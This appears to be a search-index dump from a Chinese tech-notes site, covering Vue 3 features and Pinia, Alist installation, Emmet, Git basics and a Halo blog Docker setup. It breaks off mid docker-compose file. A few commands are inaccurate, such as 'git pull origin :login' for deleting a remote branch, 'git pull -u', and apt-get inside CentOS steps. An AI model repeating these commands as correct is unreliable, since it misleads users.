false\\\">关闭弹窗</button> </div> </div> </teleport> \",\"以一个弹窗组件为示例\",\"我们在一个嵌套的盒子里面设置弹窗\",\"App.vue\",\"<template> <div class=\\\"app\\\"> <h3>我是App组件</h3> <Child /> </div> </template> <script> import Child from \\\"./components/Child\\\" export default { name: \\\"App\\\", components: { Child }, } </script> <style> .app { background-color: gray; padding: 10px; } </style> \",\"Child.vue\",\"<template> <div class=\\\"child\\\"> <h3>我是Child组件</h3> <Son /> </div> </template> <script> import Son from \\\"./Son\\\" export default { name: \\\"Child\\\", components: { Son }, } </script> <style> .child { background-color: skyblue; padding: 10px; } </style> \",\"Son\",\"<template> <div class=\\\"son\\\"> <h3>我是Son组件</h3> <Dialog /> </div> </template> <script> import Dialog from \\\"./Dialog.vue\\\" export default { name: \\\"Son\\\", components: { Dialog }, } </script> <style> .son { position: relative; background-color: orange; padding: 10px; } </style> \",\"Dialog\",\"<template> <div> <button @click=\\\"isShow = true\\\">点我弹个窗</button> <div v-if=\\\"isShow\\\" class=\\\"mask\\\"> <div class=\\\"dialog\\\"> <h3>我是一个弹窗</h3> <h4>一些内容</h4> <h4>一些内容</h4> <h4>一些内容</h4> <button @click=\\\"isShow = false\\\">关闭弹窗</button> </div> </div> </div> </template> <script> import { ref } from \\\"vue\\\" export default { name: \\\"Dialog\\\", setup() { let isShow = ref(false) return { isShow } }, } </script> <style> .mask { position: absolute; top: 0; bottom: 0; left: 0; right: 0; background-color: rgba(0, 0, 0, 0.5); } .dialog { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; width: 300px; height: 300px; background-color: green; } </style> \",\"我们在 Dialog 组件中加一个 teleport 标签\",\"<template> <div> <button @click=\\\"isShow = true\\\">点我弹个窗</button> <teleport to=\\\"body\\\"> <div v-if=\\\"isShow\\\" class=\\\"mask\\\"> <div class=\\\"dialog\\\"> <h3>我是一个弹窗</h3> <h4>一些内容</h4> <h4>一些内容</h4> <h4>一些内容</h4> <button @click=\\\"isShow = false\\\">关闭弹窗</button> </div> </div> </teleport> </div> </template> \"]},{\"header\":\"3. Suspense\",\"slug\":\"_3-suspense\",\"contents\":[\"等待异步组件时渲染一些额外内容，让应用有更好的用户体验\",\"使用步骤：\",\"异步引入组件\",\"import {defineAsyncComponent} from 'vue' const Child = defineAsyncComponent(()=>import('./components/Child.vue')) \",\"使用 Suspense 包裹组件，并配置好 default 与 fallback\",\" <template> <div class=\\\"app\\\"> <h3>我是App组件</h3> <Suspense> <template v-slot:default> <Child/> </template> <template v-slot:fallback> <h3>加载中.....</h3> </template> </Suspense> </div> </template> \",\"default：就是组件要显示的内容\",\"fallback：就是组件没加载完全的“备胎”\"]}]},\"/front-end/vue-notes/28-Vue3%E5%85%B6%E4%BB%96%E6%94%B9%E5%8F%98.html\":{\"title\":\"Vue3其他改变\",\"contents\":[{\"header\":\"1. 全局API的转移\",\"slug\":\"_1-全局api的转移\",\"contents\":[\"Vue2.x 有许多全局 API 和配置\",\"例如：注册全局组件、注册全局指令等\",\"//注册全局组件 Vue.component('MyButton', { data: () => ({ count: 0 }), template: '<button @click=\\\"count++\\\">Clicked {{ count }} times.</button>' }) //注册全局指令 Vue.directive('focus', { inserted: el => el.focus() } \",\"Vue 3.0 中对这些 API 做出了调整：\",\"将全局的 API，即：Vue.xxx 调整到应用实例（app）上\",\"2.x 全局 API（Vue）\",\"3.x 实例 API（app）\",\"Vue.config.xxxx\",\"app.config.xxxx\",\"Vue.config.productionTip\",\"移除\",\"Vue.component\",\"app.component\",\"Vue.directive\",\"app.directive\",\"Vue.mixin\",\"app.mixin\",\"Vue.use\",\"app.use\",\"Vue.prototype\",\"app.config.globalProperties\"]},{\"header\":\"2. 其他改变\",\"slug\":\"_2-其他改变\",\"contents\":[\"data 选项应始终被声明为一个函数\",\"过渡类名的更改：\",\"Vue2.x 写法\",\".v-enter, .v-leave-to { opacity: 0; } .v-leave, .v-enter-to { opacity: 1; } \",\"Vue3.x 写法\",\".v-enter-from, .v-leave-to { opacity: 0; } .v-leave-from, .v-enter-to { opacity: 1; } \",\"移除keyCode作为 v-on 的修饰符，同时也不再支持 config.keyCodes\",\"移除 v-on.native 修饰符\",\"父组件中绑定事件\",\"<my-component v-on:close=\\\"handleComponentEvent\\\" v-on:click=\\\"handleNativeClickEvent\\\" /> \",\"子组件中声明自定义事件\",\"<script> export default { emits: ['close'] } </script> \",\"移除过滤器（filter）\",\"过滤器虽然这看起来很方便，但它需要一个自定义语法，打破大括号内表达式是 “只是 JavaScript” 的假设，这不仅有学习成本，而且有实现成本！建议用方法调用或计算属性去替换过滤器\"]}]},\"/front-end/vue-notes/29-Pinia.html\":{\"title\":\"Pinia\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"Pinia 是 Vue 的存储库，它允许您跨组件/页面共享状态，类似Vuex\"]},{\"header\":\"1. 安装Pinia\",\"slug\":\"_1-安装pinia\",\"contents\":[\"在项目中安装：\",\"yarn add pinia # or with npm npm install pinia \"]},{\"header\":\"2. 创建Pinia实例并挂载\",\"slug\":\"_2-创建pinia实例并挂载\",\"contents\":[\"在src/main.ts中创建pinia实例并挂载到Vue实例上\",\"import { createApp } from 'vue'; // 引入 createPinia import { createPinia } from 'pinia'; import App from './App.vue'; // 创建pinia 实例 const pinia = createPinia(); const app = createApp(App); // 挂载到根实例上 app.use(pinia); app.mount('#app'); \"]},{\"header\":\"3. 定义Store\",\"slug\":\"_3-定义store\",\"contents\":[\"store 是使用defineStore() 定义的，第一个参数是整个应用中store的唯一名称(id)\",\"建议：可以为defineStore()的返回值任意命名，但是最好使用use加上store的名称和Store，例如：useUserStore、useCartStore、useProductStore\",\"新建文件夹store，在store中新建文件index.js\",\"import { defineStore } from 'pinia'; import {ref,computed} from 'vue'; //定义容器 export const useMainStore = defineStore('main',()=>{ // 数据（state） const sum = ref(0); // 修改数据的方法（action+mutations） const add = ()=>{ sum.value++; }; const cSum = computed(()=>{ return sum.value*10; }); return{ sum, cSum, add }; }); \"]},{\"header\":\"4. 基本使用\",\"slug\":\"_4-基本使用\",\"contents\":[\"如果在组件中使用，需要先将store引入，并在setup中声明调用，使用模板语法即可在模板中使用\",\"<template> <button @click=\\\"mainStore.add()\\\">{{mainStore.sum}}</button> <h3>放大十倍为：{{mainStore.cSum}}</h3> </template> <script setup> //导入定义的store import { useMainStore } from '../store'; //获取容器中的state const mainStore = useMainStore(); //从store中取值 console.log(mainStore.sum); </script> \",\"如果取多个值时，每次都需要mainStore，这样就很麻烦\",\"我们想到用解构赋值，但是这样取出来的数据是有问题的，它已经丢失了响应式，也就是一次性的\",\"// Pinia 其实就是把 state 数据都做了 reactive 处理了 const { sum,cSum } = mainStore; \",\"就像上面这段代码，解构出来的数据就已经失去了响应式，如果之后对数据的修改Vue是无法监测到数据变化的\",\"解决办法：这里就需要使用Pinia为我们提供的storeToRefs()API\",\"<template> <button @click=\\\"add()\\\">{{sum}}</button> <h3>放大十倍为：{{cSum}}</h3> </template> <script setup> import { storeToRefs } from 'pinia'; //导入定义的store import { useMainStore } from '../store'; //获取容器中的state const mainStore = useMainStore(); const { sum,cSum } = storeToRefs(mainStore); </script> \",\"方法解构时使用普通解构即可\",\"const {add} = mainStore; \"]}]},\"/front-end/vue-notes/\":{\"title\":\"Vue笔记\",\"contents\":[]},\"/software-tool/alist/01-%E5%AE%89%E5%8D%93%E7%AB%AF%E5%AE%89%E8%A3%85Alist.html\":{\"title\":\"安卓端安装Alist\",\"contents\":[{\"header\":\"1. 安装termux\",\"slug\":\"_1-安装termux\",\"contents\":[\"从 F-Droid 下载 termux 和 Termux:Widget\",\"更换清华源：termux | 镜像站使用帮助 | 清华大学开源软件镜像站\"]},{\"header\":\"2. 安装Alist\",\"slug\":\"_2-安装alist\",\"contents\":[\"在 termux 中输入如下命令：\",\"apt update && apt install alist \",\"安装成功后输入如下命令查看管理员密码：\",\"alist admin \",\"复制密码备用\",\"启动 Alist：\",\"alist server \",\"进入 localhost:5244 访问即可\"]},{\"header\":\"3. 添加存储\",\"slug\":\"_3-添加存储\",\"contents\":[\"查看官方文档即可AList文档\"]},{\"header\":\"4. 设置一键启动脚本\",\"slug\":\"_4-设置一键启动脚本\",\"contents\":[\"下载 vim：\",\"pkg install vim \",\"建立文件夹：\",\"mkdir .shortcuts \",\"进入文件夹：\",\"cd .shortcuts \",\"编辑脚本：\",\"vim start_alist.sh \",\"进入脚本编辑界面，按 i 进入编辑模式，输入以下内容：\",\"alist server \",\"输入完成后，按 esc 退出，输入 :wq 保存\",\"进入桌面，添加安卓小部件，将脚本添加到桌面即可\"]},{\"header\":\"5. 更新Alist\",\"slug\":\"_5-更新alist\",\"contents\":[\"在 termux 中输入 pkg upgrade alist 即可\"]}]},\"/software-tool/alist/02-Windows%E7%AB%AF%E5%AE%89%E8%A3%85Alist.html\":{\"title\":\"Windows端安装Alist\",\"contents\":[{\"header\":\"1. 安装\",\"slug\":\"_1-安装\",\"contents\":[\"Github地址：Alist\",\"去 releases 里下载最新版 Windows 安装包\",\"下载完成后解压即可\",\"然后在文件资源管理器中找到 alist.exe 文件，在地址栏输入 cmd 后回车\",\"进入命令提示符后输入 alist server 即可\",\"进入浏览器进入 localhost:5244 即可访问\",\"使用 alist admin 命令可以查看管理员密码\"]},{\"header\":\"2. 开机自启\",\"slug\":\"_2-开机自启\",\"contents\":[\"在 alist.exe 文件的目录里新建一个文件名为 alist.vbs\",\"文件内容为：\",\"Set ws = CreateObject(\\\"Wscript.Shell\\\") ws.run \\\"alist.exe server\\\",vbhide \",\"然后右键该文件创建快捷方式，将快捷方式剪切，在地址栏输入 shell:startup\",\"将快捷方式粘贴进来即可\"]},{\"header\":\"3. 更新\",\"slug\":\"_3-更新\",\"contents\":[\"去官网下载最新安装包，将 alist.exe 文件替换为最新的即可\"]}]},\"/software-tool/alist/\":{\"title\":\"Alist\",\"contents\":[]},\"/software-tool/emmet/01-Emmet%E8%AF%AD%E6%B3%95.html\":{\"title\":\"Emmet语法\",\"contents\":[{\"header\":\"1. 简介\",\"slug\":\"_1-简介\",\"contents\":[\"Emmet 语法的前身是 Zen coding, 它使用缩写, 来提高 html/css 的编写速度, Vscode 内部已经集成该语法\"]},{\"header\":\"2. 快速生成HTML结构语法\",\"slug\":\"_2-快速生成html结构语法\",\"contents\":[\"生成标签直接输入标签名按 tab 键即可比如 div 然后 tab 键，就可以生成 <div></div>\",\"如果想要生成多个相同标签加上 * 就可以了比如 div*3 就可以快速生成 3 个 div\",\"如果有父子级关系的标签，可以用 > 比如 ul > li 就可以了\",\"如果有兄弟关系的标签，用 + 就可以了比如 div+p\",\"如果生成带有类名或者 id 名字的，直接写 .demo 或者 #two然后按tab 键即可生成<div class=\\\"demo\\\"></div>或<div id=\\\"demo\\\"></div>\",\"如果生成的 div 类名是有顺序的，可以用自增符号 $\",\"如果想要在生成的标签内部写内容可以用 { } 表示\"]},{\"header\":\"3. 快速生成CSS样式语法\",\"slug\":\"_3-快速生成css样式语法\",\"contents\":[\"CSS 基本采取简写形式即可\",\"比如 w 200 按 tab 可以生成 width: 200 px;\",\"比如 lh 26 px 按 tab 可以生成  line-height: 26 px;\"]}]},\"/software-tool/emmet/\":{\"title\":\"Emmet\",\"contents\":[]},\"/software-tool/git/01-Git%E5%9F%BA%E7%A1%80.html\":{\"title\":\"Git基础\",\"contents\":[{\"header\":\"1. Git简介\",\"slug\":\"_1-git简介\",\"contents\":[\"Git 是目前世界上最先进的分布式版本控制系统\",\"版本控制系统（version control system）, 是一种记录一个或若干文件内容变化，以便将来查阅特定版本修订情况的系统\"]},{\"header\":\"1.1 Git的诞生\",\"slug\":\"_1-1-git的诞生\",\"contents\":[\"Git 是由 Linux 之父 Linus 开发的，在 2005 年 4 月 3 号开始开发，到 4 月 7 号仅四天时间 Git 就可以投入使用了。到同年 6 月份，Linux 已经在使用 Git 管理代码了\",\"Git 是用什么语言开发的：C 语言\"]},{\"header\":\"1.2 集中式vs分布式\",\"slug\":\"_1-2-集中式vs分布式\",\"contents\":[\"集中式和分布式的区别是：你的本地是否有完整的版本库历史！\",\"假设 SVN 服务器没了，那你丢掉了所有历史信息，因为你的本地只有当前版本以及部分历史信息。必须联网才能工作\",\"假设 GitHub 服务器没了，你不会丢掉任何 git 历史信息，因为你的本地有完整的版本库信息。你可以把本地的 git 库重新上传到另外的 git 服务商。可以离线工作\"]},{\"header\":\"2. 安装Git\",\"slug\":\"_2-安装git\",\"contents\":[\"在 Windows 上使用 Git，可以从 Git 官网直接下载安装程序，然后按默认选项安装即可\",\"安装完成后，在桌面右键菜单里找到Git Bash Here，会出现一个类似命令行窗口的东西，说明 Git 安装成功！输入git -v可以查看版本号\"]},{\"header\":\"3. Git初始化\",\"slug\":\"_3-git初始化\",\"contents\":[]},{\"header\":\"3.1 设置用户签名\",\"slug\":\"_3-1-设置用户签名\",\"contents\":[\"签名的作用就是用来标识用户，以区分不同的开发人员\",\"==安装完成后，还需要最后一步设置，==在命令行输入：\",\"git config --global user.name \\\"Your Name\\\" git config --global user.email \\\"email@example.com\\\" \",\"注意 git config 命令的 --global 参数，用了这个参数，表示你这台机器上所有的 Git 仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和 Email 地址\"]},{\"header\":\"3.2 初始化仓库\",\"slug\":\"_3-2-初始化仓库\",\"contents\":[\"如果你使用 Windows 系统，为了避免遇到各种莫名其妙的问题，请确保目录名（包括父目录）不包含中文\",\"通过 git init 命令可以把目录变成 Git 可以管理的仓库：\",\"# git 初始化的指令 git init \",\"瞬间 Git 就把仓库建好了，而且告诉你是一个空的仓库（empty Git repository），可以发现当前目录下多了一个 .git 的目录，这个目录是 Git 来跟踪仓库的，没事千万不要手动修改这个目录里面的文件，不然改乱了，就把 Git 仓库给破坏了。\",\"如果你没有看到 .git 目录，那是因为这个目录默认是隐藏的，用 ls -ah 命令就可以看见\",\"也不一定必须在空目录下创建 Git 仓库，选择一个已经有东西的目录也是可以的\"]},{\"header\":\"4. Git工作机制\",\"slug\":\"_4-git工作机制\",\"contents\":[\"Git有三个区域：分别是Git工作区、暂存区和版本库\",\"具体流程：代码提交到暂存区（暂时保存），然后暂存区提交到 master 分支（版本库）\"]},{\"header\":\"4.1 Git工作区\",\"slug\":\"_4-1-git工作区\",\"contents\":[\"在电脑里面能够看得到的项目目录，但是项目目录下隐藏了一个 .git 目录，这个目录不属于工作区，而是版本库\"]},{\"header\":\"4.2 Git暂存区\",\"slug\":\"_4-2-git暂存区\",\"contents\":[\"英文叫 stage 或 index。一般存放在 .git 目录下的 index 文件（.git/index）中，所以我们把暂存区有时也叫作索引（index）\"]},{\"header\":\"4.3 Git版本库\",\"slug\":\"_4-3-git版本库\",\"contents\":[\".git 目录就是版本库\"]},{\"header\":\"5. 托管平台\",\"slug\":\"_5-托管平台\",\"contents\":[\"局域网（内网） \",\"GitLab\",\"公网（外网） \",\"GitLab\",\"GitHub\",\"Gitee\"]},{\"header\":\"6. 添加文件到暂存区\",\"slug\":\"_6-添加文件到暂存区\",\"contents\":[\"我们要放入暂存区，要使用 git add 命令\",\"把单独一个文件放在暂存区\",\"# 把文件夹下的index.txt文本放在暂存区 git add index.txt \",\"把单独一个文件夹放在暂存区（暂存区不能存放空文件夹）\",\"# 把文件夹下的test文件夹放在暂存区 git add test/ \",\"把所有文件都放在暂存区\",\"# 把文件夹下所有的内容都放在暂存区 git add --all # git add --all 有一个简单的写法 git add . \",\"可以使用 git status 命令来查看仓库当前的状态 可以使用 git rm --cached <file> 命令来从暂存区中删除 file\"]},{\"header\":\"7. 提交暂存区到本地仓库\",\"slug\":\"_7-提交暂存区到本地仓库\",\"contents\":[\"将暂存区文件提交到本地仓库，使用 git commit 命令\",\"# 把暂存区的内容放到本地仓库 git commit -m \\\"备注\\\" \",\"我们使用 git log 命令来查看版本信息\",\"# 查看当前历史区版本信息 git log \"]},{\"header\":\"8. 切换版本\",\"slug\":\"_8-切换版本\",\"contents\":[]},{\"header\":\"8.1 版本回退\",\"slug\":\"_8-1-版本回退\",\"contents\":[\"使用 git reset --hard 版本编号 进行版本回退（回退到工作区）\",\"# 回退到上一次提交的版本 git reset --hard HEAD^ # 回退到上上次提交的版本 git reset --hard HEAD~2 \",\"Git 的版本回退速度非常快，因为 Git 在内部有个指向当前版本的 HEAD 指针，当你回退版本的时候，Git 仅仅是把 HEAD 从指向 当前版本 ，改为指向 要回到的版本\",\"然后顺便把工作区的文件更新了。所以你让 HEAD 指向哪个版本号，你就把当前版本定位在哪\",\"如果回退错了，可以使用 git reflog 命令来查看所有的操作记录，可以通过前面的标识符（版本号）来回退\",\"使用 git reset --soft 版本编号 可以回退到暂存区，用处：备注重写和版本合并\"]},{\"header\":\"8.2 git revert和git reset\",\"slug\":\"_8-2-git-revert和git-reset\",\"contents\":[\"git reset 是回滚到对应的 commit-id，相当于是删除了 commit-id 以后的所有的提交，并且不会产生新的 commit-id 记录，如果要推送到远程服务器的话，需要强制推送-f\",\"git revert 是反做撤销其中的 commit-id，然后重新生成一个 commit-id。本身不会对其他的提交 commit-id 产生影响，如果要推送到远程服务器的话，就是普通的操作 git push 就可以\"]},{\"header\":\"9. Git分支\",\"slug\":\"_9-git分支\",\"contents\":[]},{\"header\":\"9.1 初识分支\",\"slug\":\"_9-1-初识分支\",\"contents\":[\"git 分支，就是我们自己把我们的整个文件夹分成一个一个独立的区域\",\"比如我们在开发 登录 功能的时候，可以放在 login 分支下进行开发；在开发 列表 功能的时候，可以放在 list 分支下进行开发，大家互不干扰，每一个功能都是一个独立的功能分支，这样开发会更好\",\"git 在初始化的时候，会自动生成一个分支，叫做 master，是表示主要分支的意思\",\"我们可以自己开辟出很多独立分支\"]},{\"header\":\"9.2 分支管理\",\"slug\":\"_9-2-分支管理\",\"contents\":[\"开辟一个分支，使用 git branch 分支名称 命令\",\"# 开辟一个login分支 git branch login \",\"查看一下当前分支情况，前面有个 * 的，并且有高亮显示的，表示你当前所处的分支\",\"# 查看当前分支情况 git branch \",\"切换分支（HEAD 指向会跟着一起变），使用 git checkout 分支名称 命令\",\"# 切换到master分支 git checkout master \",\"注意：切换分支时，记得将当前分支提交到暂存区（git add）\",\"合并分支，使用 git merge 分支名称 命令\",\"# 合并login分支到master分支 # 首先切换到master分支 git checkout master # 合并分支 git merge login \",\"删除分支，使用 git branch -d 分支名称 命令\",\"# 删除login分支 # 先切换到别的分支 git checkout master # 删除login分支 git branch -d login \"]},{\"header\":\"9.3 分支合并冲突\",\"slug\":\"_9-3-分支合并冲突\",\"contents\":[\"分支合并后如有冲突，git 会在文件中标识出来，需要我们人工解决冲突\"]},{\"header\":\"10. 团队协作\",\"slug\":\"_10-团队协作\",\"contents\":[\"需要使用托管平台来实现，如 GitHub\"]},{\"header\":\"10.1 创建并连接GitHub远端仓库\",\"slug\":\"_10-1-创建并连接github远端仓库\",\"contents\":[\"首先，登陆 GitHub，然后，在右上角找到“Create a new repo”按钮，创建一个新的仓库，在 Repository name 填入你的仓库名，其他保持默认设置，点击“Create repository”按钮，就成功地创建了一个新的 Git 仓库\",\"目前，在GitHub上的这个仓库还是空的，GitHub告诉我们，可以从这个仓库克隆出新的仓库，也可以把一个已有的本地仓库与之关联，然后，把本地仓库的内容推送到GitHub仓库\",\"现在，我们根据 GitHub 的提示，在本地的要上传的仓库下运行命令：\",\"git remote add origin git@github.com:你的账户名/你的仓库名.git # 如：git remote add origin git@github.com:zhf521/learngit.git # 这里的origin是你的远端库的别名，可以是任意的，以后你提交的时候就可以向origin提交即可 # 使用 git remote remove origin 命令即可删除,这里的origin是仓库的别名，可以使用git remote -v查看 \",\"使用 git remote -v 可以查看连接的远程库\"]},{\"header\":\"10.2 推送\",\"slug\":\"_10-2-推送\",\"contents\":[\"使用 git push 推送\",\"git push origin master # 将本地分支推送到远程库（别名为origin）master分支上 \",\"加上 -u 参数即可以后只使用 git push 来推送\",\"git push -u origin master \",\"关于-u参数\",\"-u 参数是 Git 命令中的一个可选参数，通常用于在执行 git push 或 git pull 等命令时，建立本地分支和远程分支之间的关联关系。其实际含义是 --set-upstream，表示设置当前分支跟踪指定的远程分支\",\"当使用 git push 命令将本地分支推送到远程仓库的某个分支时，如果指定了 -u 参数，Git 会在成功推送后自动把本地分支和远程分支建立一个追踪关系。这样，在以后的操作中，Git 就知道要将本地分支与哪个远程分支进行同步，并可以通过简单的命令来完成相应的操作\",\"例如，执行以下命令：\",\"git push -u origin master \",\"以上命令将会把本地的 master 分支推送到名为 origin 的远程仓库，并在本地的 master 分支与远程的 origin/master 分支之间建立追踪关系。这样，在以后的操作中，可以直接使用 git push 命令将本地的 master 分支提交到远程的 origin/master 分支上，或者使用 git pull 命令将远程的 origin/master 分支上的更新合并到本地的 master 分支上\",\"需要注意的是，-u 参数只用于首次推送本地分支时，后续的推送和拉取操作可以直接使用 git push 和 git pull 命令来完成。另外，在执行 git branch 命令时，可以通过 -u 参数来手动建立本地分支和远程分支之间的追踪关系\"]},{\"header\":\"10.3 拉取\",\"slug\":\"_10-3-拉取\",\"contents\":[\"使用 git pull 拉取更新的文件\",\"git pull origin master # 将远程库（别名为origin）master分支拉取到本地分支上 \",\"加上 -u 参数即可以后只使用 git pull 来推送\",\"git pull -u origin master \"]},{\"header\":\"10.4 克隆\",\"slug\":\"_10-4-克隆\",\"contents\":[\"使用 git clone 仓库地址 克隆远程仓库里面的内容到本地==（注意：克隆只能克隆主分支）==\",\"可以克隆别人的公开的仓库，也可以克隆自己的仓库，克隆别人的仓库，我们只能拿来用，修改后不能重新上传；克隆自己的仓库，我们修改后还可以再次上传更新\",\"# 直接克隆仓库 git clone 仓库地址 \"]},{\"header\":\"11. 团队协作的分支管理\",\"slug\":\"_11-团队协作的分支管理\",\"contents\":[\"本地分支推送到远程分支\",\"使用 git push 推送\",\"git push origin login # 将本地分支推送到远程库（别名为origin）login分支上 \",\"注意：克隆只能克隆主分支，需要拉取分支\",\"使用 git pull 拉取更新的文件\",\"git pull origin login # 将远程库（别名为origin）login分支拉取到本地分支上 \",\"删除远程分支\",\"git pull origin :login # 将远程库（别名为origin）login分支删除 \"]},{\"header\":\"12. 跨团队协作\",\"slug\":\"_12-跨团队协作\",\"contents\":[\"先 fork 到自己的仓库，然后修改，然后 pull request，等待原作者审核\"]},{\"header\":\"13. 忽略文件\",\"slug\":\"_13-忽略文件\",\"contents\":[\"在使用 git 过程中，我们可能有些文件不需要上传上去，比如一些缓存文件，生成的图片，运行环境的一些配置等等，这时就需要用到 .gitignore 文件来忽略掉这些文件\"]},{\"header\":\"13.1 创建.gitignore文件\",\"slug\":\"_13-1-创建-gitignore文件\",\"contents\":[\"在要管理的根目录下（即 .git 文件夹同级目录中）创建一个 .gitignore文件\",\"# 创建.gitignore文件命令 touch .gitignore \"]},{\"header\":\"13.2 写入要忽略的文件或文件夹\",\"slug\":\"_13-2-写入要忽略的文件或文件夹\",\"contents\":[\"使用 Vim 来写入\",\"# 命令 vim .gitignore \",\"注意：.gitignore 只能忽略那些原来没有被 track 的文件，如果某些文件已经被纳入了版本管理中，则修改 .gitignore 是无效的。那么解决方法就是先把本地缓存删除（改变成未 track 状态），然后再提交\",\"# 命令 git rm -r --cached git add . git commit -m 'update .gitignore' \"]},{\"header\":\"13.3 .gitignore的格式规范\",\"slug\":\"_13-3-gitignore的格式规范\",\"contents\":[\"# 为注释\",\"可以使用 shell 所使用的正则表达式来进行模式匹配\",\"匹配模式最后跟 / 说明要忽略的是目录\",\"使用 ! 取反，（例如目录中包含 test.a，并且 .gitignore 文件中包含 *.[oa]，如果在文件中加入 !test.a 表明忽略除 test.a 文件以外的后缀名为 .a 或者 .o 的文件）\"]},{\"header\":\"13.4 配置语法\",\"slug\":\"_13-4-配置语法\",\"contents\":[\"以斜杠 / 开头表示目录\",\"以星号 * 通配多个字符\",\"以问号 ? 通配多个字符\",\"以方括号 [] 包含单个字符的匹配列表\",\"以感叹号 ! 表示不忽略（跟踪）匹配到的文件或目录\",\"例如：\",\"*.a # 忽略所有 .a 结尾的文件 !lib.a # 但 lib.a 除外 /TODO # 仅仅忽略项目根目录下的 TODO 文件，不包括subdir/TODO build/ # 忽略 build/ 目录下的所有文件 doc/*.txt # 会忽略 doc/notes.txt 但不包括 doc/server/arch.txt \",\"注意：git 对于 .gitignore 配置文件是按行从上到下进行规则匹配的，意味着如果前面的规则匹配的范围更大，则后面的规则将不会生效\"]},{\"header\":\"14. VSCode集成Git\",\"slug\":\"_14-vscode集成git\",\"contents\":[\"VSCode 中已经集成了 Git\"]},{\"header\":\"15. 一图总结\",\"slug\":\"_15-一图总结\",\"contents\":[\"Git基础01.png\"]}]},\"/software-tool/git/\":{\"title\":\"Git\",\"contents\":[]},\"/software-tool/halo/01-Halo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA.html\":{\"title\":\"Halo博客搭建\",\"contents\":[{\"header\":\"1. 购买服务器\",\"slug\":\"_1-购买服务器\",\"contents\":[\"需要购买服务器，内存至少 1G，这里以腾讯云为例，进入官网腾讯云选购自己的服务器即可，推荐轻量应用服务器。购买以后装入 centos 系统\",\"Halo博客搭建01.png\",\"防火墙开放 8090 端口\",\"Halo博客搭建02.png\"]},{\"header\":\"2. 安装Docker\",\"slug\":\"_2-安装docker\",\"contents\":[\"以下为 centos 系统安装教程，其他系统请参照官网教程官网\"]},{\"header\":\"2.1 登录自己的服务器\",\"slug\":\"_2-1-登录自己的服务器\",\"contents\":[\"Halo博客搭建03.png\"]},{\"header\":\"2.2 卸载旧版本\",\"slug\":\"_2-2-卸载旧版本\",\"contents\":[\"sudo yum remove docker \\\\ docker-client \\\\ docker-client-latest \\\\ docker-common \\\\ docker-latest \\\\ docker-latest-logrotate \\\\ docker-logrotate \\\\ docker-engine \"]},{\"header\":\"2.3 更新、安装必备软件\",\"slug\":\"_2-3-更新、安装必备软件\",\"contents\":[\"apt-get update && apt-get install -y wget vim \"]},{\"header\":\"2.4 获取安装包\",\"slug\":\"_2-4-获取安装包\",\"contents\":[\"sudo yum install -y yum-utils \"]},{\"header\":\"2.5 设置镜像仓库\",\"slug\":\"_2-5-设置镜像仓库\",\"contents\":[\"官方镜像：（比较慢，不推荐）\",\"sudo yum-config-manager \\\\ --add-repo \\\\ https://download.docker.com/linux/centos/docker-ce.repo \",\"阿里镜像仓库 ：（推荐）\",\"sudo yum-config-manager \\\\ --add-repo \\\\ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo \"]},{\"header\":\"2.6 安装docker\",\"slug\":\"_2-6-安装docker\",\"contents\":[\"安装前先更新 yum 软件包索引\",\"yum makecache fast \",\"安装 docker-ce（社区版-免费的）\",\"sudo yum install docker-ce docker-ce-cli containerd.io \"]},{\"header\":\"2.7 启动docker\",\"slug\":\"_2-7-启动docker\",\"contents\":[\"sudo systemctl start docker \"]},{\"header\":\"2.8 判断是否成功安装docker\",\"slug\":\"_2-8-判断是否成功安装docker\",\"contents\":[\"docker version \"]},{\"header\":\"2.9 设置docker开机自启动\",\"slug\":\"_2-9-设置docker开机自启动\",\"contents\":[\"systemctl enable docker \"]},{\"header\":\"3. 使用Docker部署 Halo\",\"slug\":\"_3-使用docker部署-halo\",\"contents\":[\"建议查看官方教程\",\"使用 Docker 部署 Halo\"]},{\"header\":\"4. 进入后台安装\",\"slug\":\"_4-进入后台安装\",\"contents\":[\"通过访问 IP：端口号即可访问安装引导界面\",\"安装完即可\"]},{\"header\":\"5. 购买域名 (可选)\",\"slug\":\"_5-购买域名-可选\",\"contents\":[\"进入腾讯云官网腾讯云选购\",\"注意：服务器与域名最好选用同一厂商，不然可能会莫名报错，配置失败\",\"添加域名解析，如图\",\"Halo博客搭建04.png\"]},{\"header\":\"6. 反向代理 (可选)\",\"slug\":\"_6-反向代理-可选\",\"contents\":[]},{\"header\":\"6.1 安装Docker Compose\",\"slug\":\"_6-1-安装docker-compose\",\"contents\":[]},{\"header\":\"6.1.1 下载安装\",\"slug\":\"_6-1-1-下载安装\",\"contents\":[\"sudo curl -L https://github.com/docker/compose/releases/download/1.16.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose \",\"推荐使用下面这个，国内访问较快\",\"sudo curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose \"]},{\"header\":\"6.1.2 给执行权限\",\"slug\":\"_6-1-2-给执行权限\",\"contents\":[\"sudo chmod +x /usr/local/bin/docker-compose \"]},{\"header\":\"6.1.3 查看docker-compose版本\",\"slug\":\"_6-1-3-查看docker-compose版本\",\"contents\":[\"docker-compose --version \"]},{\"header\":\"6.2 部署Nginx Proxy Manager服务\",\"slug\":\"_6-2-部署nginx-proxy-manager服务\",\"contents\":[]},{\"header\":\"6.2.1 创建一个与此类似的 docker-compose.yml文件\",\"slug\":\"_6-2-1-创建一个与此类似的-docker-compose-yml文件\",\"contents\":[\"mkdir ~/npm #创建一个目录用来安装此服务 cd ~/npm #进入目录 \",\"vim docker-compose.yml #将以下代码粘贴到里面然后保存退出 \",\"version: \\\"3\\\" services: app: image: 'jc21/nginx-proxy-manager:latest' restart: unless-stopped ports: # These ports are in format <host-port>:<container-port> - '80:80' # Public HTTP Port - '443:443' # Public HTTPS Port - '81:81' # Admin Web Port # Add any other Stream port you want to expose # - '21:21' # FTP environment: DB_MYSQL_HOST: \\\"db\\\" DB_MYSQL_PORT: 3306 DB_MYSQL_USER: \\\"npm\\\" DB_MYSQL_PASSWORD: \\\"npm\\\" DB_MYSQL_NAME: \\\"npm\\\" # Uncomment this if IPv6 is not enabled on your host # DISABLE_IPV6: 'true' volumes: - ./data:/data - ./letsencrypt:/etc/letsencrypt depends_on: - db db: image: 'jc21/mariadb-aria:latest' 